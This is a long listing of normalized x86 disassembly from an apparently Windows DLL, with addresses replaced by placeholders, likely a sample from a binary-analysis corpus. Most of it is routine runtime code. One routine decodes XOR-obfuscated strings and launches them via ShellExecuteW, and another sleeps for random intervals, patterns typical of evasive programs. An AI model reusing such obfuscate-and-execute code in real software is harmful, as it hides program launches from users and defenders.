mov edx 0x30
mov [ ebp - 0x44 ] dx
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x24 ] 0x7
mov edx [ eax ]
mov edx [ edx + 0xc ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_100451c0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
pop esi
jmp edx
sub_100451f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_10017366
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002868d
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1005ae42
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_100453a0
cmp [ esi + 0x30 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] cx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
retn
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x4
sub_100453f0
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xf4 ]
lea edx [ ebp - 0xf8 ]
mov esi ecx
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_100263e0
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x78
mov [ ebp - 0xfc ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0xfc ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xe4 ]
mov eax 0xca
call sub_1000a6f0
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x4c ]
mov eax 0xd2
mov [ ebp - 0xf0 ] ebx
call sub_1000a6f0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x111
call sub_1000a6f0
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x60 ]
mov eax 0x68
mov [ ebp - 0xec ] ebx
call sub_1000a6f0
lea edx [ ebp - 0xec ]
push edx
lea eax [ ebp - 0x60 ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x36
call sub_1000a6f0
push 0x20
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x57
call sub_1000a6f0
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
xor eax eax
fldz
mov [ eax + 0x4 ] ebx
fstp [ eax + 0x10 ]
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ eax + 0xc ] ebx
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebx
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x128
call sub_1000a6f0
mov ebx ecx
mov edi eax
call sub_10068620
xor ebx ebx
jmp r-xdata
mov ecx [ ebp - 0xf8 ]
mov esi [ ebp - 0xe8 ]
mov [ esi ] eax
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x9c
call sub_1000a6f0
mov ecx [ ebp - 0xe8 ]
mov edi [ ecx ]
mov ebx eax
call sub_10067110
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xde
call sub_1000a6f0
mov edx [ ebp - 0xe8 ]
mov edi [ edx ]
mov ebx eax
call sub_1000b880
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xfc ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x88
call sub_1000a6f0
fldz
mov ecx [ esi ]
fstp [ ecx + 0x10 ]
push eax
call sub_1004c7aa
mov eax [ esi ]
fstp [ eax + 0x10 ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x9f
call sub_1000a6f0
mov eax [ esi ]
mov [ eax + 0x18 ] ebx
push eax
call sub_1004c7aa
fnstcw [ ebp - 0xe6 ]
movzx eax [ ebp - 0xe6 ]
mov edx [ esi ]
add esp 0x4
or eax 0xc00
mov [ ebp - 0x100 ] eax
fldcw [ ebp - 0x100 ]
fistp [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
mov [ edx + 0x18 ] eax
fldcw [ ebp - 0xe6 ]
jmp r-xdata
mov eax [ ebp - 0xec ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_100456d4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_10045700
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10052185
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_1002050e
push ecx
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_10045750
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push eax
push edx
call sub_10023990
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10051390
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_1004579c
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000de59
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10045840
push ebp
mov ebp esp
sub esp 0x440
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor eax eax
push esi
lea ecx [ ecx ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffb4
and esi 0xff
mov [ ebp + eax * 2 - 0x30 ] si
inc eax
cmp eax 0x11
jb r-xdata
push edx
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov ecx 0x104
lea ebx [ ebp - 0x238 ]
mov [ ebp - 0xe ] ax
call sub_100254a0
mov ecx [ r--data ]
add esp 0x8
pop esi
xor eax eax
pop ebx
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8a
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
push 0x104
lea ecx [ ebp - 0x440 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x6 ] ax
call [ GetEnvironmentVariableW@IAT ]
push 0x0
push 0x0
lea eax [ ebp - 0x238 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
push 0x0
push 0x0
call [ ShellExecuteW@IAT ]
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp eax 0x20
setg dl
xor ecx ebp
mov eax edx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10045920
mov eax [ esi + 0x1c ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x20 ]
call sub_1001b300
mov eax [ esi + 0x1c ]
push eax
call sub_10065045
add esp 0x4
pop edi
push esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
call sub_10065045
add esp 0x4
mov eax esi
pop ebx
retn
push eax
call sub_10065045
add esp 0x4
sub_10045970
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008261e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x438
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x430 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x448 ]
mov [ fs : 0x0 ] eax
mov ebx [ GetProcessHeap@IAT ]
push 0x11
push 0x8
call ebx
mov edi [ HeapAlloc@IAT ]
push eax
call edi
mov esi eax
mov eax [ r--data ]
mov [ esi ] eax
mov ecx [ r--data ]
mov [ esi + 0x4 ] ecx
mov edx [ r--data ]
mov [ esi + 0x8 ] edx
mov ax [ r--data ]
mov [ esi + 0xc ] ax
mov cl [ r--data ]
push 0xc
push 0x8
mov [ esi + 0xe ] cl
call ebx
push eax
call edi
mov edx [ r--data ]
mov edi eax
mov [ edi ] edx
mov eax [ r--data ]
mov [ edi + 0x4 ] eax
mov ecx [ r--data ]
push 0x4
push 0x0
mov [ edi + 0x8 ] ecx
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x450 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x108 ] 0x0
jne r-xdata
push esi
push eax
call ebx
mov esi [ HeapFree@IAT ]
push eax
call esi
push edi
push 0x0
call ebx
push eax
call esi
mov eax 0x3f2
mov ecx [ esp + 0x448 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x430 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov [ esp + 0x450 ] 0xffffffff
test eax eax
jne r-xdata
lea ecx [ esp + 0x24 ]
push ecx
call sub_1000b569
mov eax [ esp + 0x28 ]
xor edx edx
mov ecx 0x36ee80
div ecx
add esp 0x4
push edx
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ eax + 0x110 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x450 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0x4 ]
lea esi [ eax + 0x4 ]
sar edx 0x2
test edx edx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ esi ]
mov edx eax
sub edx ecx
push sub_10017220
sar edx 0x2
push edx
push eax
push ecx
call sub_10060520
mov eax [ esi ]
mov ecx [ eax ]
mov al [ ecx + 0x3e ]
add esp 0x10
xor al al
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
xor esi esi
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
cmp edi ebx
je r-xdata
inc al
movzx edx al
push edx
lea eax [ esp + 0x18 ]
push eax
call sub_10030cc0
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
mov esi edi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
xor esi esi
mov [ eax + 0x104 ] esi
mov [ eax + 0x10c ] esi
mov [ eax + 0x108 ] 0x1
mov eax [ eax + 0x110 ]
push eax
call [ ReleaseMutex@IAT ]
jmp r-xdata
mov ecx edi
call sub_10002020
lea ecx [ esp + 0x3bc ]
push ecx
call sub_10005600
mov ebx eax
lea edx [ esp + 0x2bc ]
push edx
mov [ esp + 0x454 ] 0x2
call sub_10005600
mov [ esp + 0x38 ] eax
lea eax [ esp + 0x1bc ]
push eax
mov [ esp + 0x454 ] 0x3
call sub_10005600
mov [ esp + 0x28 ] eax
lea ecx [ esp + 0xbc ]
push ecx
mov [ esp + 0x454 ] 0x4
call sub_10005600
mov esi eax
lea edx [ esp + 0x23c ]
push edx
mov [ esp + 0x454 ] 0x5
call sub_10005600
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x33c ]
push eax
mov [ esp + 0x454 ] 0x6
call sub_10005600
mov [ esp + 0x2c ] eax
lea ecx [ esp + 0x13c ]
push ecx
mov [ esp + 0x454 ] 0x7
call sub_10005600
mov [ esp + 0x30 ] eax
lea edx [ esp + 0x3c ]
push edx
mov [ esp + 0x454 ] 0x8
call sub_10005600
lea ecx [ esi + 0x58 ]
mov esi 0x8
mov [ esp + 0x450 ] 0x9
cmp [ ecx + 0x14 ] esi
jb r-xdata
push edi
call sub_10065045
add esp 0x4
xor esi esi
call sub_10024d10
sub esi 0xffffff80
cmp esi ebx
jne r-xdata
mov [ esp + 0x450 ] 0xffffffff
cmp edi esi
je r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov esi [ esp + 0x30 ]
add esi 0x1c
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ecx ]
mov ecx [ esp + 0x34 ]
add ecx 0x3c
cmp [ ecx + 0x14 ] esi
jb r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov esi [ esi ]
mov ebx [ ebx + 0x7c ]
push ebx
mov ebx [ esp + 0x3c ]
mov ebx [ ebx + 0x78 ]
push ebx
mov ebx [ esp + 0x30 ]
movzx ebx [ ebx + 0x74 ]
push ebx
mov ebx [ esp + 0x38 ]
movzx ebx [ ebx + 0x38 ]
push ebx
push esi
push eax
call sub_1000f8d0
lea esi [ esp + 0x3c ]
mov [ esp + 0x450 ] 0x8
call sub_10024d10
lea esi [ esp + 0x13c ]
mov [ esp + 0x450 ] 0x7
call sub_10024d10
lea esi [ esp + 0x33c ]
mov [ esp + 0x450 ] 0x6
call sub_10024d10
lea esi [ esp + 0x23c ]
mov [ esp + 0x450 ] 0x5
call sub_10024d10
lea esi [ esp + 0xbc ]
mov [ esp + 0x450 ] 0x4
call sub_10024d10
lea esi [ esp + 0x1bc ]
mov [ esp + 0x450 ] 0x3
call sub_10024d10
lea esi [ esp + 0x2bc ]
mov [ esp + 0x450 ] 0x2
call sub_10024d10
lea esi [ esp + 0x3bc ]
mov [ esp + 0x450 ] 0x1
call sub_10024d10
sub edi 0xffffff80
cmp edi [ esp + 0x18 ]
jne r-xdata
mov eax [ eax ]
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
sub_10045daa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_1004ba5c
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
mov cl 0x30
cmp eax ebx
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_10061855
pop ecx
push eax
mov edi r--data
push edi
call sub_100783e0
add esp 0xc
cmp eax ebx
je r-xdata
add esi 0x2
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_10061855
pop ecx
push eax
push edi
call sub_100783e0
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_10012991
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10045f46
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1000f2c4
push r--data
push r--data
call sub_100601c1
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_100117a0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_1001261a
call sub_10025945
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_100117a0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10045fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008076d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10042df0
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_1005d090
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_10051900
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
push 0x24ac4
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1006a380
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10025a80
add esp 0x10
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_1003b4a6
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100657d0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001ad10
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1003b4a6
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1002a5c0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_1005ceb0
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10051900
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
